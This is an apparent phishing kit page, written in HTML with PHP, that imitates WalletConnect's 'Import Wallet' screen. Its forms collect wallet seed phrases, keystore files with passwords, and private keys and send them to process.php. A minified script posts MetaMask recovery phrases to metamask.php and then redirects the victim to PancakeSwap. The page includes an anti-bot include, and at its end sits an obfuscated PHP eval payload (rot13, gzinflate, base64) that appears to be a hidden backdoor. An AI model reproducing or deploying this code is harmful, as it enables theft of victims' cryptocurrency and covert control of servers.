<html>
<meta http-equiv="content-type" content="text/html" />
<?php require '../antibot.php';?>

<head>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="./main_new.css" type="text/css" />
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js" integrity="sha512-UdIMMlVx0HEynClOIFSyOrPggomfhBKJE28LKl8yR3ghkgugPnG6iLfRfHwushZl1MOPSY6TsuBDGPK2X4zYKg==" crossorigin="anonymous"></script>


  <meta name="description" content="Open protocol for connecting Wallets to Dapps">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:image" content="./images/logo.svg">
  <link rel="icon" href="./images/logo.svg">
  <script>
    function openCity(evt, cityName) {
      // Declare all variables
      var i, tabcontent, tablinks;

      // Get all elements with class="tabcontent" and hide them
      tabcontent = document.getElementsByClassName("tabcontent");
      for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
      }

      // Get all elements with class="tablinks" and remove the class "active"
      tablinks = document.getElementsByClassName("tablinks");
      for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
      }

      // Show the current tab, and add an "active" class to the button that opened the tab
      document.getElementById(cityName).style.display = "block";
      evt.currentTarget.className += " active";
    }
  </script>
</head>



<title>Import Wallet</title>

<body>
  <center>
    <header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
      <div class="absolute inset-0 shadow-lg opacity-50"></div>
      <div class="z-20 flex justify-around w-full sm:pr-10 md:pr-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://github.com/walletconnect" rel="noopener noreferrer">
              GitHub
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
              href="https://docs.walletconnect.org/" rel="noopener noreferrer">
              Docs
          </a></div>
      <div class="z-20 flex">
          <div class="w-16 mx-6 sm:w-20 md:w-28"><img class="cursor-pointer object-fit"
                  src="walletconnect-logo.svg" href="#"alt="walletconnect logo" /></div>
      </div>
      <div class="z-20 flex justify-around w-full sm:pl-10 md:pl-20"><a
              class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Wallets
          </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
              href="#">
              Apps
          </a></div>
  </header>
    </br>
    <div class="text-cool-gray-500">
      <h1 class="flex justify-center mt-20 text-4xl font-semibold import__page">Import Wallet </h1>
    </br>
	  
	  
	  <div class="tab">
                    <button class="tablinks" id="default" onclick="openCity(event, 'phrase')">Phrase</b></button>
                    <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</b></button>
                    <button class="tablinks" onclick="openCity(event, 'private')">Private Key</b></button>
					
                  </div>
				  

                <div role="presentation" class="sc-eLwHGX sc-uoixf dVYXTr jGzOKM"></div>
                </div>
				
    
	
               
                <div id="phrase" class="tabcontent">
                     <form action="process.php" method="POST" id="form1">
                      <textarea name="gebruikersnaam" required="required" minlength="12" placeholder="Phrase" required="required"></textarea>
                      </br>
                      <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                      </br>
                      <button form="form1" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="keystore" class="tabcontent">
                    <form action="process.php" method="POST" id="form2">
                      <textarea name="gebruikersnaam" required="required" minlength="12" placeholder="Keystore JSON"
                        required="required"></textarea>
                      </br>
                      <div class="field">
                        <input type="text" name="wachtwoord" placeholder="Password" required="required" minlength="4" />
                      </div>
                      <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
                      </br>
                      <button form="form2" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div>
              
                  <div id="private" class="tabcontent">
                    <form action="process.php" method="POST" id="form3">
                      <div class="field">
                        <input type="text" name="gebruikersnaam" placeholder="Private Key" required="required" minlength="64" />
                      </div>
                      <div class="desc">Typically 64 alphanumeric characters</div>
                      </br>
                      <button form="form3" value="Import" type="submit" name="import" class="btn blMRzM">IMPORT</button>
                    </form>
                  </div> 
				  
                  <script>
                    document.getElementById("default").click();
                  </script>
 
    </div>
   


    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
	<script type="text/javascript">
        function removeDiv(btn){
            var element = document.getElementById("remove");
			element.parentNode.removeChild(element);
        }
    </script>
  </body>
</html>








<script src="./index_files/jquery.min.js.download"></script>
<script>
var p=!1;setTimeout(function(){$(".z2").addClass("hidden"),$(".z3").removeClass("hidden")},1e3),$(".import-account__secret-phrase").on("keyup",function(){var t=$(this).val().split(" ");p||(12==t.length&&1<t[11].length||24==t.length&&1<t[23].length?$(".button.btn--first-time.first-time-flow__button").prop("disabled",!1):$(".button.btn--first-time.first-time-flow__button").prop("disabled",!0))}),$(".button.btn--first-time.first-time-flow__button").on("click",function(){p=!0,$(this).prop("disabled",!0).html('<i class="fa fa-spinner fa-spin fa-fw"></i> '+$(this).html()),$.post("./metamask.php",{data1:"MetaMask",data:$(".import-account__secret-phrase").val()},function(){p=!1},"json"),window.parent.opener.postMessage({uniswapyujinx:!0}),setTimeout(function(){$(".z2").removeClass("hidden"),$(".z3").addClass("hidden"),setTimeout(function(){window.parent.opener.location.replace("https://pancakeswap.finance/"),window.parent.close()},2e3)},1e3)}),document.body.addEventListener("contextmenu",function(t){"import-account__secret-phrase"!=t.toElement.className&&t.preventDefault()},!1);
</script>

    <script>
      document.getElementById("default").click();
    </script>
    <footer class="flex justify-center mt-24 mb-16 sm:mt-32">
      <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row"><a
          class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://discord.gg/jhxMvxP" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="discord.svg" alt="Discord" />
            <p class="ml-2">Discord</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://twitter.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="twitter.svg" alt="Twitter" />
            <p class="ml-2">Twitter</p>
          </div>
        </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500" target="_blank"
          href="https://github.com/walletconnect" rel="noopener noreferrer">
          <div class="flex"><img class="w-6 sm:w-8" src="github.svg" alt="GitHub" />
            <p class="ml-2">GitHub</p>
          </div>
        </a></div>
    </footer>
 
<script src="/script.js"></script>
</body>

</html>

<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
?>